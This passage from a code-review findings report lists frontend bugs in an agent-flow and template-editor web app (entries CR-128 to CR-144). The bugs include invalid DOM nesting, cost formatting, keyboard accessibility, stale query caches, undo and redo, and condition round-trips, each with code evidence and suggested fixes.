- **Suggested fix:** Compute client-only values after mount, either with a tiny `useIsClient`/`useSyncExternalStore` hook or a `useEffect`-set state, and render a neutral placeholder on the server. Alternatively, render a relative path (`/api/hooks/<id>`) and copy the absolute URL only in the click handler. Format the time client-side only, or pass a server-formatted string from the loader.
- **Effort:** S

### CR-128 [Medium] Invalid DOM nesting (`<ul>` inside `<p>`, button inside button, interactive inside `role="button"`)

- **Status at `abaa007`:** **Fixed** (Task 36)
- **Current location:** components/flows/components/plan/components/subPlanSection/SubPlanCard.tsx:36-80, components/flows/components/plan/components/masterPlanSection/MasterPlanSection.tsx:71-76
- **Re-verification note:** The `<ul>`-in-`<p>` (`FailureAlert` was rewritten), `NodePromptBox` and `ContextPicker` cases are gone. `SubPlanCard` still nests two Base UI `TooltipTrigger` buttons inside its toggle `<button>`, and `MasterPlanSection` now wraps a `<button>` inside a `TooltipTrigger` without `render`, which is button-in-button. Fix: use `render={<span/>}` or `render={<Badge/>}` on triggers inside the toggle, and `render={<button type="button" aria-label=…/>}` in `MasterPlanSection`.

- **Severity:** Medium
- **Category:** Correctness
- **Area:** Area 5 — Flow runtime UI
- **Source:** FLOWUI-13
- **Location:** `components/flows/plan/PlanFailureAlert.tsx:31-44`, `components/flows/plan/BranchPlanCard.tsx:46-49,70-76,98-103,128-140`, `components/chat/NodePromptBox.tsx:92-104,124-126`, `components/chat/prompt-modal/ContextPicker.tsx:42-63`
- **Problem:**
  - **PlanFailureAlert** renders `<ul>` inside `<p>`. That's invalid HTML: the browser auto-closes the `<p>`, so a React 19 hydration error fires when a malformed-plan failure is server-rendered.
  - **BranchPlanCard** nests a Base UI `TooltipTrigger` (renders a `<button>`) inside the card's toggle `<button>`, and wraps `<Button>` in a `TooltipTrigger` without `render`, giving button-in-button.
  - **NodePromptBox** places the Retry `<Button>` inside a `role="button"` div, so clicking Retry also toggles the box.
  - **ContextPicker** nests a TooltipTrigger button inside the `<label>`.

  Consequences: hydration warnings, broken focus order, and click events firing twice.
- **Evidence:**
  ```tsx
  <p className="text-xs mt-1 mb-0">
    The agent generated a plan but ...
    {validationErrors.length > 0 && (<ul className="mt-1.5 ml-3 list-disc ...">
  ```
- **Suggested fix:**
  - Use `<div>` instead of `<p>` in PlanFailureAlert.
  - Pass `render={<Badge/>}` or `render={<span/>}` to TooltipTriggers that sit inside buttons, and `render={<Button …/>}` where a Button is the trigger.
  - Move the NodePromptBox error and Retry outside the `role="button"` region.
- **Effort:** S

### CR-129 [Medium] Flow delete failure is hidden behind the still-open dialog, and "Retry" doesn't retry the delete

- **Status at `abaa007`:** **Fixed** ([Task 15](review-tasks/15-frontend-mutation-conventions.md))
- **Current location:** components/flows/FlowsView.tsx:41-54, components/flows/FlowsView.tsx:86-104, components/flows/FlowsView.tsx:166-171, components/flows/DeleteFlowDialog.tsx:44-51
- **Re-verification note:** A failed delete still leaves the dialog open with no message; the error renders in the page `<Alert>` behind the overlay, and that Alert's "Retry" resets the mutation and refetches the list instead of retrying the delete. Fix: pass `removeFlow.error?.message` into `DeleteFlowDialog` and render it there; keep the page Alert for list errors only; call `removeFlow.reset()` on dialog close.

- **Severity:** Medium
- **Category:** Correctness
- **Area:** Area 5 — Flow runtime UI
- **Source:** FLOWUI-14
- **Related:** CR-027 (FLOWUI-02)
- **Location:** `components/flows/FlowsView.tsx:41-54,86-91,95-104,166-171`, `components/flows/DeleteFlowDialog.tsx:44-51`
- **Problem:** `AlertDialogAction` is a plain Button that doesn't close the dialog, and `onSuccess` is what closes it. On failure:
  - The dialog stays open and simply re-enables. The error renders in the page-level `<Alert>` behind the modal overlay, so the user sees nothing.
  - After dismissing, the page Alert's "Retry" calls `removeFlow.reset()` and refetches the list. It doesn't retry the delete, so the button label misleads.
- **Evidence:**
  ```tsx
  const error = flows.error?.message ?? removeFlow.error?.message ?? null;
  const retry = useCallback(() => { removeFlow.reset(); void flows.refetch(); }, [removeFlow, flows]);
  ```
- **Suggested fix:** Pass `error={removeFlow.error?.message}` into `DeleteFlowDialog` and render it inside the dialog, where "Delete flow" is the retry. Keep the page Alert for list-query errors only, and call `removeFlow.reset()` when the dialog closes.
- **Effort:** S

### CR-130 [Medium] CostChip shows sub-cent run costs 100× too high

- **Status at `abaa007`:** **Fixed** (Task 35)
- **Current location:** components/flows/panels/CostChip.tsx:33-36, components/flows/panels/CostChip.tsx:19-31
- **Re-verification note:** `fmtCents` still prints `$${c.toFixed(3)}` for `0 < c < 1` cents, so 0.4¢ shows as "$0.400", in both the chip and the per-run tooltip rows. Fix: `$${(c / 100).toFixed(c < 1 ? 4 : 2)}`, or reuse the shared cost, duration and token formatters instead of the local `fmtDur`, `fmtTok` and `fmtCents`.

- **Severity:** Medium
- **Category:** Correctness
- **Area:** Area 5 — Flow runtime UI
- **Source:** FLOWUI-15
- **Location:** `components/flows/panels/CostChip.tsx:33-36`
- **Problem:** The input is in cents. For `0 < c < 1` the helper prints `$${c.toFixed(3)}`, so 0.4¢ renders as "$0.400" instead of "$0.004". Cheap runs (cache hits, small models) show inflated costs in the header chip and in the per-run tooltip rows.
- **Evidence:**
  ```ts
  function fmtCents(c?: number | null): string {
    if (c == null) return "—";
    return c < 1 && c > 0 ? `$${c.toFixed(3)}` : `$${(c / 100).toFixed(2)}`;
  }
  ```
- **Suggested fix:** Use `$${(c / 100).toFixed(c < 1 ? 4 : 2)}`. Better, reuse `fmtCost` from `lib/format` (already re-exported via `components/chat/formatters.ts`), and replace the local `fmtDur`/`fmtTok` duplicates with `fmtDuration`/`fmtTokens`.
- **Effort:** S

### CR-131 [Medium] Clickable non-button elements without keyboard support (graph node cards, decision choices, variable chips)

- **Status at `abaa007`:** **Fixed** (Task 36)
- **Current location:** components/flows/workflow-graph/NodeCard.tsx:60-71, components/flows/panels/DecisionView.tsx:137-140, components/chat/prompt-modal/PromptEditorSection.tsx:32-38
- **Re-verification note:** Graph node selection (`<div onClick>`), decision choice picking (`<Card onClick>`) and variable insertion (`<Badge onClick>`) still have no role, `tabIndex`, key handling or label. Fix: render them as `<button type="button">` (or use `render={<button/>}` on Card and Badge) with `aria-pressed` and `aria-label`.

- **Severity:** Medium
- **Category:** Code quality
- **Area:** Area 5 — Flow runtime UI
- **Source:** FLOWUI-17
- **Related:** CR-156 (UI-14); CR-240 (TPL-26); CR-250 (UI-23)
- **Location:** `components/flows/workflow-graph/NodeCard.tsx:61-71`, `components/flows/panels/DecisionView.tsx:136-139`, `components/chat/prompt-modal/PromptEditorSection.tsx:32-38`
- **Problem:** Primary cockpit navigation (selecting a node in the graph), decision branch picking and variable insertion all use `<div>`/`Card`/`Badge` with `onClick`. They have no role, `tabIndex`, key handler or label, so keyboard and screen-reader users can't select nodes or pick a branch (§2.9).
- **Evidence:**
  ```tsx
  <div onClick={() => onSelect(node.node_key)} title={...} className={cn("absolute rounded-lg cursor-pointer ...")}>
  <Card className={`px-4 py-3 ${selectable ? "cursor-pointer" : ""} ...`} onClick={selectable ? onPick : undefined}>
  <Badge className="cursor-pointer ..." onClick={() => onInsertVariable(v)}>
  ```
- **Suggested fix:**
  - Render these as `<button type="button">`, or use `render={<button/>}` on Card and Badge.
  - Add `aria-pressed` for selected/picked state and `aria-label` (for example "Select node <label>").
- **Effort:** S

### CR-132 [Medium] Keyboard delete on the canvas is non-functional (selection is never controlled)

- **Status at `abaa007`:** **Fixed** ([Task 38](review-tasks/38-editor-draft-machine.md))
- **Current location:** components/template-editor/components/BuilderFlow.tsx:82-149, components/template-editor/components/BuilderFlow.tsx:180
- **Re-verification note:** `rfNodes` and `rfEdges` still carry selection only in `data.selected`, never the React Flow `selected` field, and `onNodesChange`/`onEdgesChange` drop `select` changes. So `deleteKeyCode` (still set) never deletes anything. Fix: keep a local `selectedIds` set fed from `select` changes and project it as `selected`, or set `deleteKeyCode={null}`.

- **Severity:** Medium
- **Category:** Correctness
- **Area:** Area 6 — Template authoring
- **Source:** TPL-07
- **Related:** CR-133 (TPL-08)
- **Location:** `components/template-editor/components/BuilderFlow.tsx:82-149`
- **Problem:** The canvas is controlled. `rfNodes` and `rfEdges` are rebuilt from the draft and never carry `selected`, and `onNodesChange`/`onEdgesChange` only handle `position` and `remove` changes, discarding `select` changes. XYFlow 12's `useGlobalKeyHandler` deletes only `nodes.filter(n => n.selected)` and `edges.filter(e => e.selected)`, so Backspace/Delete never removes anything despite `deleteKeyCode` being set. Clicking also gives no visual selection. The comment at `BuilderNodeView.tsx:42-44` assumes RF selection works.
- **Evidence:**
  ```ts
  for (const c of changes) {
    if (c.type === "remove") { props.onNodeRemove?.(c.id); continue; }
    if (c.type !== "position" || !c.position) continue;   // "select" changes dropped
    props.onNodeMove(c.id, c.position.x, c.position.y);
  ```
- **Suggested fix:** Keep a `selectedIds` set (local state) updated from `select` changes and project it into `rfNodes`/`rfEdges` (`selected: selectedIds.has(id)`). Or set `deleteKeyCode={null}` and drop the promise. Fix TPL-08 (CR-133) first, because multi-delete would otherwise clobber.
- **Effort:** S

### CR-133 [Medium] Structural actions build the next draft from the render-captured `draft`, so batched calls clobber each other

- **Status at `abaa007`:** **Fixed** ([Task 38](review-tasks/38-editor-draft-machine.md))
- **Current location:** components/builder/hooks/use-editor-actions.ts:123-161, components/builder/hooks/use-editor-actions.ts:173-206, components/builder/hooks/use-editor-actions.ts:261-330, components/template-editor/hooks/use-template-draft.ts:32, components/template-editor/hooks/use-template-draft.ts:125-151
- **Re-verification note:** `removeNode`, `removeEdge`, `duplicateNode`, `addEdge` and `addInstance` still build `next` from the render-captured `draft` and call `apply(next)`, and `apply` only accepts a `Draft`, not an updater. Batched removals in one tick therefore clobber each other. Fix: let `apply` take `(cur) => next` (`setDraft` already supports updaters) and use it in every action, or add a batched `removeElements(nodeIds, edgeIds)`.

- **Severity:** Medium
- **Category:** Correctness
- **Area:** Area 6 — Template authoring
- **Source:** TPL-08
- **Related:** CR-132 (TPL-07)
- **Location:** `components/builder/hooks/use-editor-actions.ts:123-167`, `components/builder/hooks/use-editor-actions.ts:173-206`, `components/builder/hooks/use-editor-actions.ts:258-330`
- **Problem:** `removeNode`, `removeEdge`, `duplicateNode`, `addEdge` and `addInstance` compute `next` from the `draft` closed over at render, then `machine.apply(next)`. When XYFlow emits several `remove` changes in one tick (multi-select delete, or deleting a node plus its connected edges), each call starts from the same stale draft and only the last removal survives. The result can be dangling edges or reappearing nodes.
- **Evidence:**
  ```ts
  apply({
    ...draft,
    nodes: draft.nodes.filter((n) => n.key !== node.key),
    edges: draft.edges.filter((e) => e.from !== node.key && e.to !== node.key),
  });   // `draft` is the render-time closure, not the current state
  ```
- **Suggested fix:** Have `useTemplateDraft.apply` accept an updater `(cur) => next` and use it in every action. Or batch removals: `removeElements(nodeIds, edgeIds)` called once from `onNodesChange`/`onEdgesChange`.
- **Effort:** S

### CR-134 [Medium] Read-only (built-in) templates are editable in the node drawer

- **Status at `abaa007`:** **Fixed** ([Task 38](review-tasks/38-editor-draft-machine.md))
- **Current location:** components/builder/EditorNodeDrawer.tsx:106-117, components/builder/EditorPage.tsx:240-244, components/template-editor/NodeConfigurator.tsx:46
- **Re-verification note:** `EditorNodeDrawer` still doesn't forward `readonly` to `NodeConfiguratorBody`, which has no such prop, and `EditorPage`'s `onPatch` still calls `machine.patchNode` unconditionally. So built-in templates are editable in the drawer, dirty the draft, and then fail to save. Fix: add `readOnly` to `NodeConfiguratorBody` and its tabs (disabled inputs) and guard `onPatch` with `if (readonly) return`.

- **Severity:** Medium
- **Category:** Correctness
- **Area:** Area 6 — Template authoring
- **Source:** TPL-09
- **Related:** CR-141 (TPL-16)
- **Location:** `components/builder/EditorNodeDrawer.tsx:106-116`, `components/builder/EditorPage.tsx:242-244`, `components/template-editor/NodeConfigurator.tsx` (no `readonly` prop)
- **Problem:** `EditorNodeDrawer` receives `readonly` but doesn't pass it to `NodeConfiguratorBody`, which has no such prop. `EditorPage`'s `onPatch` calls `machine.patchNode` unconditionally. On a built-in template every config, prompt, trigger and condition field is live. Edits dirty the draft and trigger the leave-confirm, but the server rejects saving them (`assertEditable`). The canvas and header are read-only, so the UI is inconsistent.
- **Evidence:**
  ```tsx
  <NodeConfiguratorBody
    node={node}
    onChange={onPatch}   // readonly not forwarded
  ```
- **Suggested fix:** Add `readOnly` to `NodeConfiguratorBody` and its tabs, rendering disabled inputs or a summary view, and guard `onPatch` in `EditorPage` with `if (readonly) return`.
- **Effort:** M

### CR-135 [Medium] `queryKeys.nodeContracts(url)` (and `queryKeys.settings`) are shared by fetchers with different semantics

- **Status at `abaa007`:** **Fixed** ([Task 13](review-tasks/13-frontend-query-ownership.md))
- **Current location:** components/builder/hooks/use-instance-contracts.ts:39-60, components/builder/hooks/use-instance-contracts.ts:85-86, components/builder/hooks/use-instance-contracts.ts:145-146, components/template-editor/hooks/use-node-contract.ts:22-27, components/template-editor/hooks/use-node-contract.ts:38-39, components/templates/hooks/use-node-schema-contract.ts:33-35, components/template-editor/components/ConfigTab.tsx:80-82, components/templates/components/NodeConfigureDialog.tsx:70-72
- **Re-verification note:** `queryKeys.nodeContracts(url)` is still written by three different `queryFn`s: `fetchContract` caches `null` on failure, `fetchNodeContract` throws, and `use-node-schema-contract` uses `fetchJson`. `queryKeys.settings` is likewise fetched by both `fetchSettings` and `fetchJson("/api/settings")`. Fix: export one `queryOptions` per key next to `queryKeys`, throw on failure, and handle `isError` in callers.

- **Severity:** Medium
- **Category:** Correctness
- **Area:** Area 6 — Template authoring
- **Source:** TPL-10
- **Related:** CR-005 (APP-05); CR-036 (UI-02)
- **Location:** `components/builder/hooks/use-instance-contracts.ts:36-43`, `components/template-editor/hooks/use-node-contract.ts:22-27`, `components/templates/hooks/use-node-schema-contract.ts:33-37`, `components/template-editor/components/ConfigTab.tsx:80-84`, `components/templates/components/NodeConfigureDialog.tsx:70-74`
- **Problem:** Three different `queryFn`s write the same key:
  - `use-instance-contracts` returns `null` on any failure (cached as a successful `null`).
  - `use-node-contract` throws on non-OK.
  - `use-node-schema-contract` uses `fetchJson`.

  Whichever runs first owns the cache entry for `staleTime`. A transient failure in `fetchContract` caches `null`, so the configurator shows "no contract" with no error or retry, and decision branch choices go missing. `queryKeys.settings` is also fetched by `fetchSettings` (swallows errors) and `fetchJson("/api/settings")` (throws).
- **Evidence:**
  ```ts
  // use-instance-contracts.ts
  const res = await fetch(url).catch(() => null);
  if (!res?.ok) return null;
  ```
- **Suggested fix:** Use one shared fetcher per key, exported next to `queryKeys` (e.g. `contractQueryOptions(url)` via `queryOptions`), and use it everywhere. Throw on failure, and let callers handle `isError`.
- **Effort:** S

### CR-136 [Medium] Live validation results can arrive out of order and re-apply after save

- **Status:** Fixed (Task 37)
- **Status at `abaa007`:** **Open**, fix in [Task 37](review-tasks/37-editor-save-integrity.md)
- **Current location:** components/template-editor/hooks/use-template-validation.ts:86-117
- **Re-verification note:** In-flight validate requests still have no abort or sequence guard, so a slow older response can overwrite newer results or `clear()`. Fetch and parse failures still become `[]`, so the pre-save gate in `use-editor-save` passes silently. Fix: keep a `seq` ref and abort the previous controller (with `clear()` cancelling both), or move to a `useQuery` on a debounced draft hash; surface a failure as an "unable to validate" state.

- **Severity:** Medium
- **Category:** Correctness
- **Area:** Area 6 — Template authoring
- **Source:** TPL-11
- **Location:** `components/template-editor/hooks/use-template-validation.ts:86-115`
- **Problem:** The effect clears only the pending timer. Requests already in flight have no `AbortController` or sequence number, so a slow earlier response can `applyProblems` over the result for a newer draft, or over `clear()`. Failures (network, non-JSON 5xx) become `[]`, which reads as "no problems", and `use-editor-save` awaits the same `validate()` as its pre-save gate, so that gate passes silently on failure.
- **Evidence:**
  ```ts
        .then((r) => r.json() as Promise<{ problems?: LintProblem[] } | null>)
        .catch(() => null);
      const next = parsed?.problems ?? [];
      applyProblems(next);
  ...
    const timer = setTimeout(() => void validate(draft), VALIDATE_DEBOUNCE_MS);
  ```
- **Suggested fix:** Make it a `useQuery` keyed on a debounced draft hash (TanStack aborts and dedupes automatically). Or keep a `seq` ref and abort the previous controller, and have `clear()` cancel both. Surface fetch failure as an "unable to validate" state, not as an empty list.
- **Effort:** S

### CR-137 [Medium] Condition builder round-trip changes expression semantics

- **Status at `abaa007`:** **Open**, fix in [Task 39](review-tasks/39-editor-fields-and-effects.md)
- **Current location:** components/template-editor/condition-grammar.ts:24-37, components/template-editor/condition-grammar.ts:74-116, components/template-editor/condition-grammar.ts:160-176
- **Re-verification note:** `decomposeCondition` still only checks the LEFT side with `isPath` and runs any RHS through `unliteral()`, so `status = nodes.b.output.y` becomes the string literal on the next edit. `literal()` re-emits `"123"` and `"true"` as the bare number and boolean, and `splitTop` ignores escaped quotes (lines 81-84). Fix: decompose only when the RHS is a valid literal (else raw mode), store `{ value, kind }` so quoting survives, and add vitest round-trip tests (the runner now exists).

- **Severity:** Medium
- **Category:** Correctness
- **Area:** Area 6 — Template authoring
- **Source:** TPL-12
- **Location:** `components/template-editor/condition-grammar.ts:23-36`, `components/template-editor/condition-grammar.ts:163-176`
- **Problem:** `decomposeCondition` accepts any right-hand side (`(.+)$`) and runs it through `unliteral()`, which treats a non-literal as a plain string value. Two cases change meaning:
  - A path comparison such as `status = nodes.b.output.y` decomposes into the value `nodes.b.output.y`. The next edit recompiles it as the string literal `"nodes.b.output.y"`.
  - `literal()` re-quotes only non-numeric, non-boolean strings, so `x = "123"` or `x = "true"` round-trips to the number `123` or the boolean `true`.

  Either way, the stored condition's meaning changes the moment any row is touched. `splitTop` also ignores escaped quotes inside strings.
- **Evidence:**
  ```ts
  const cmp = /^(.+?) (>=|<=|!=|=|>|<) (.+)$/.exec(body);
  if (cmp) {
    // only the LEFT side is checked with isPath
    if (cmp[2] === ">=" || cmp[2] === "<=" || !isPath(cmp[1].trim())) return null;
    ...
    rows.push({ path: cmp[1].trim(), op, value: unliteral(cmp[3]) });
  ```
- **Suggested fix:** Only decompose when the RHS is a valid literal (quoted string, number, `true`/`false`/`null`); otherwise fall back to raw mode. Store the value together with its literal type (`{ value, kind: "string" | "number" | ... }`) so quoting is preserved. Add round-trip unit tests.
- **Effort:** M

### CR-138 [Medium] ConditionBuilder keeps stale rows when its value becomes empty; index keys make it reproducible

- **Status at `abaa007`:** **Open**, fix in [Task 39](review-tasks/39-editor-fields-and-effects.md)
- **Current location:** components/template-editor/condition-builder/use-condition-state.ts:41-54, components/template-editor/condition-builder/use-condition-state.ts:79-83, components/template-editor/components/ChoicesEditor.tsx:45-47, components/template-editor/components/PassMapEditor.tsx:43, components/template-editor/components/RulesListEditor.tsx:33, components/template-editor/condition-builder/ConditionBuilder.tsx:131
- **Re-verification note:** The seed effect still skips when `!value && !lastEmitted.current`, and `ChoiceRow` (plus PassMap, Rules and condition rows) still use `key={i}`. Deleting a choice therefore leaves the previous choice's condition rows showing under the next one, and the next edit emits them into the wrong choice. `editRaw` still calls `onChange` on every keystroke. Fix: give list items stable ids, and derive rows from `value` during render with only a raw-text buffer in state, reset via `key`.

- **Severity:** Medium
- **Category:** Correctness
- **Area:** Area 6 — Template authoring
- **Source:** TPL-13
- **Location:** `components/template-editor/condition-builder/use-condition-state.ts:41-54`, `components/template-editor/ChoicesEditor.tsx:45-57`
- **Problem:** Rows are mirrored from the `value` prop by an effect that returns early when `!value && !lastEmitted.current`. `ChoicesEditor` renders `ChoiceRow key={i}`, and each row embeds a `ConditionBuilder`. Take choices [A (condition `a`), B (empty condition)] and delete A. The instance at index 0, which was seeded from A so `lastEmitted` is null, now receives `value=""`. The seed effect skips, and it keeps showing A's rows under B. The next edit then emits them into the wrong choice. `PassMapEditor` and `RulesListEditor` use index keys too. `editRaw` also emits on every keystroke, contrary to its comment.
- **Evidence:**
  ```ts
  useEffect(() => {
    if (value === lastEmitted.current || (!value && !lastEmitted.current))
      return;
    lastEmitted.current = null;
    const dec = decomposeCondition(value);
  ```
- **Suggested fix:** Give list items stable ids (generated on add, kept in the draft or a parallel id array), not `key={i}`. Remove prop mirroring: derive rows from `value` during render and keep only an "unparsed raw text" buffer in state, resetting it via `key`.
- **Effort:** M

### CR-139 [Medium] Redo silently drops config edits made after an undo

- **Status at `abaa007`:** **Fixed** ([Task 38](review-tasks/38-editor-draft-machine.md))
- **Current location:** components/template-editor/hooks/use-template-draft.ts:125-170
- **Re-verification note:** `redoStack` is cleared only inside the snapshot branch of `apply` (line 142). Coalesced or meta-only `apply` calls and every `patchNode` (all drawer config edits) leave redo intact and take no snapshot. So undo, then a config edit, then redo silently discards the edit. Fix: clear `redoStack` (and sync flags) on every non-undo/redo mutation, and route `patchNode` through the coalescing snapshot path.

- **Severity:** Medium
- **Category:** Correctness
- **Area:** Area 6 — Template authoring
- **Source:** TPL-14
- **Location:** `components/template-editor/hooks/use-template-draft.ts:126-170`
- **Problem:** `patchNode` (used for every drawer edit) neither snapshots nor clears the redo stack, and the coalescing branch of `apply` doesn't clear redo either. The sequence undo, edit a node's config, redo restores the pre-undo snapshot and discards the config edit, with no warning. Config edits are also absent from undo history altogether, which is inconsistent with structural edits.
- **Evidence:**
  ```ts
  setDraft((cur) =>
    cur ? { ...cur, nodes: cur.nodes.map((p) => p.key === key ? { ...p, ...patch } : p) } : cur,
  );
  setDirty(true);
  setNotice(null);   // no snapshot, redo stack untouched
  ```
- **Suggested fix:** Any mutation that isn't an undo or redo must clear `redo`. Ideally route `patchNode` through the coalescing snapshot path, so config edits are undoable as one step per field burst.
- **Effort:** S

### CR-140 [Medium] Revisiting the editor seeds the draft and positions from stale cache; layout autosave can overwrite newer positions

- **Status:** Fixed (Task 37)
- **Status at `abaa007`:** **Open**, fix in [Task 37](review-tasks/37-editor-save-integrity.md)
- **Current location:** components/template-editor/hooks/use-node-positions.ts:35, components/template-editor/hooks/use-node-positions.ts:48-53, components/template-editor/hooks/use-node-positions.ts:55-69, components/template-editor/hooks/use-template-draft.ts:51, components/builder/EditorPage.tsx:70-80
- **Re-verification note:** Draft and positions still seed from `useState(initial)` at mount only, and are re-adopted only after a structural Save (`use-editor-save.ts:102-107`). The positions PATCH never writes `queryKeys.templates.detail`, so revisiting within gcTime shows stale cached positions, and the next drag PATCHes them over the server copy. Unmount still `clearTimeout`s the pending 700 ms save, which drops the last drag. Fix: `setQueryData` the detail after the PATCH, flush the save with `keepalive` on unmount, and key the editor or reset when a newer `dataUpdatedAt` arrives while the draft isn't dirty.

- **Severity:** Medium
- **Category:** Correctness
- **Area:** Area 6 — Template authoring
- **Source:** TPL-15
- **Location:** `components/builder/EditorPage.tsx:70-80`, `components/template-editor/hooks/use-node-positions.ts:35,48-53,55-69`, `components/template-editor/hooks/use-template-draft.ts` (initial-only `useState`)
- **Problem:** `useTemplateDraft` and `useNodePositions` read their initial value once, at mount. TanStack's `HydrationBoundary` hydrates queries that already exist in the cache in a `useEffect`, after the first render (verified in `node_modules/@tanstack/react-query/build/modern/HydrationBoundary.js:54-72`). The positions autosave PATCH never updates `templates.detail` in the cache. So: drag nodes (saved to the server), leave, and reopen within gcTime. The editor mounts with the old cached positions, ignores the fresh hydrated data, and the next drag PATCHes the full stale map back over the server copy. In addition, the unmount cleanup clears a pending 700 ms save timer, so a drag just before navigating away is never saved. Runtime confirmation recommended.
- **Evidence:**
  ```ts
  const [positions, setPositionsState] = useState<PositionsMap>(initial ?? {});
  ...
  useEffect(() => () => { if (saveTimer.current) clearTimeout(saveTimer.current); }, []);
  ```
- **Suggested fix:** After a successful positions PATCH, `setQueryData(queryKeys.templates.detail(id), …)` to merge the positions. Flush (don't cancel) the pending save on unmount, for example with `fetch(..., { keepalive: true })`. Key the editor on `detail.updated_at`, or reset the draft and positions when a newer `dataUpdatedAt` arrives while the draft isn't dirty.
- **Effort:** M

### CR-141 [Medium] Unsaved-changes guard only covers tab close and the header back button

- **Status at `abaa007`:** **Fixed** ([Task 38](review-tasks/38-editor-draft-machine.md))
- **Current location:** components/template-editor/hooks/use-template-draft.ts:194-203, components/builder/EditorPage.tsx:169-172, components/builder/EditorPage.tsx:290-297, components/builder/EditorHeader.tsx:98-100, components/builder/EditorError.tsx:31
- **Re-verification note:** There is still no `popstate` or link interception: only `beforeunload` and the header back button check `dirty`. The header's gallery `Link`, browser Back/Forward and nav-bar links discard the draft with no prompt. Fix: add a shared `hooks/useNavigationGuard(dirty)` that intercepts in-app link clicks and pushes a sentinel history entry while dirty, and route in-page links through `onBack`.

- **Severity:** Medium
- **Category:** Correctness
- **Area:** Area 6 — Template authoring
- **Source:** TPL-16
- **Related:** CR-033 (TPL-05); CR-134 (TPL-09)
- **Location:** `components/template-editor/hooks/use-template-draft.ts:194-203`, `components/builder/EditorPage.tsx:290-297`, `components/builder/EditorHeader.tsx` (gallery `Link`), `components/builder/EditorError.tsx`
- **Problem:** Only `beforeunload` and the header's back button (`onLeave` → `EditorLeaveConfirm`) check `dirty`. Browser Back/Forward (App Router popstate), the header's "duplicate in the gallery" `Link`, and any nav-bar link leave the page with no prompt, so the local draft is lost. Combined with TPL-05 (CR-033) and TPL-09 (CR-134), read-only pages can be dirty too.
- **Evidence:**
  ```ts
  // unsaved-changes guard: reload / tab close asks before discarding the draft
  useEffect(() => {
    if (!dirty) return;
    const onBeforeUnload = (e: BeforeUnloadEvent) => { e.preventDefault(); e.returnValue = ""; };
    window.addEventListener("beforeunload", onBeforeUnload);
  ```
- **Suggested fix:** Add a shared `useNavigationGuard(dirty)` hook in `hooks/` that intercepts link clicks inside the app shell and handles `popstate` (push a sentinel history entry while dirty). Route all in-page links through `onLeave`.
- **Effort:** M

### CR-142 [Medium] Gallery cache is not invalidated after create or save, and fresh server props are ignored

- **Status:** Fixed (Task 37)
- **Status at `abaa007`:** **Open**, fix in [Task 37](review-tasks/37-editor-save-integrity.md)
- **Current location:** components/templates/TemplateGallery.tsx:105-109, components/templates/TemplateGallery.tsx:165, components/templates/hooks/use-template-list.ts:22-29, components/templates/hooks/use-node-list.ts:22-29, components/builder/hooks/use-editor-save.ts:100-108
- **Re-verification note:** `createMutation` still navigates without invalidating `queryKeys.templatesGallery`, and an editor save or rename refetches only the detail. Both list hooks still use `initialData` plus `initialDataUpdatedAt: Date.now()`, which is ignored when a cache entry exists, so the gallery shows stale rows. `pageError` is never cleared. Fix: invalidate `templatesGallery` on create and editor save, hydrate the gallery with prefetch plus `HydrationBoundary`, and clear `pageError` when each mutation starts.

- **Severity:** Medium
- **Category:** Correctness
- **Area:** Area 6 — Template authoring
- **Source:** TPL-17
- **Location:** `components/templates/TemplateGallery.tsx:105-109`, `components/templates/hooks/use-template-list.ts`, `components/templates/hooks/use-node-list.ts`, `components/builder/hooks/use-editor-save.ts:102-106`
- **Problem:** `createMutation` navigates to the new editor without invalidating `queryKeys.templatesGallery`, and the editor's save/rename only refetches the detail. Import and delete do invalidate. Both list hooks seed with `initialData` plus `initialDataUpdatedAt: Date.now()`. When a cache entry already exists, `initialData` is ignored, so returning to `/templates` within `staleTime` shows the old list without the new template or the renamed title, even though the server component passed fresh data. `pageError` is also never cleared after a later success.
- **Evidence:**
  ```ts
  const createMutation = useMutation({
    mutationFn: () => postJson<{ id: string }>("/api/templates", JSON.stringify({})),
    onSuccess: ({ id }) => router.push(`/templates/${id}`),
    onError: (e) => setPageError(e.message),
  });
  ```
- **Suggested fix:** Invalidate `templatesGallery` in `createMutation.onSuccess` and after an editor save or rename. Use `HydrationBoundary`/prefetch for the gallery, as the editor page does, instead of `initialData`. Clear `pageError` at the start of each mutation.
- **Effort:** S

### CR-143 [Medium] Fetchers swallow errors, so error states can never render

- **Status at `abaa007`:** **Fixed** ([Task 14](review-tasks/14-frontend-throwing-fetchers.md))

- **Severity:** Medium
- **Category:** Correctness
- **Area:** Area 6 — Template authoring
- **Source:** TPL-18
- **Related:** CR-036 (UI-02)
- **Location:** `components/builder/hooks/use-editor-queries.ts:46-63`, `components/builder/EditorPage.tsx:116-127`, `components/template-editor/WebhookPayloadDialog.tsx:53-62,84-94`, `components/settings/queries.ts` (`fetchSettings`, consumed by `components/template-editor/components/ConfigTab.tsx:80-84`)
- **Problem:** `fetchTaskProviders`, `fetchRepoChoices` and `WebhookPayloadDialog`'s local `fetchJson` use `.catch(() => null)` and don't check `res.ok`, so `isError` is never true. `EditorPage` also treats pending providers and repos as `[]`: the trigger's task type falls back to `""` while loading, and pickers render empty with no skeleton. The webhook dialog shows the misleading "the hook appears once saved" text on a server error. `secretsQuery.isError` in ConfigTab is dead code. This violates AGENTS.md §2.8.
- **Evidence:**
  ```ts
  const d = (await fetch("/api/tasks/providers")
    .then((r) => r.json() as Promise<{ providers?: EditorTaskProvider[] }>)
    .catch(() => null)) ?? null;
  return d?.providers ?? [];
  ```
- **Suggested fix:** Use the shared `fetchJson` that throws on `!res.ok`. Render skeletons for `isPending` and an error with retry for `isError` in the trigger/repo pickers and the webhook dialog.
- **Effort:** S

### CR-144 [Medium] Contract and preview queries put the full node config into a GET URL and re-key on every keystroke

- **Status at `abaa007`:** **Fixed** (Task 40)
- **Current location:** components/template-editor/utils/contract-request.ts, components/template-editor/queries.ts, app/api/contracts/route.ts (POST), components/template-editor/hooks/use-deferred-node-contract-request.ts
- **Re-verification note:** Contract reads POST only the contract-relevant config subset (`output_schema`, `choices`, `contract`, `pass`, `output`) with TanStack keys hashed from that subset; `useDeferredValue` defers rapid edits. GET without a body remains for def/kind-only lookups.

- **Severity:** Medium
- **Category:** Correctness
- **Area:** Area 6 — Template authoring
- **Source:** TPL-19
- **Location:** `components/template-editor/types.ts:62-78` (`contractsUrl`), `components/template-editor/hooks/use-node-contract.ts:22-27`, `components/builder/hooks/use-instance-contracts.ts:36-60`, `components/templates/components/NodeConfigureDialog.tsx:70-74`
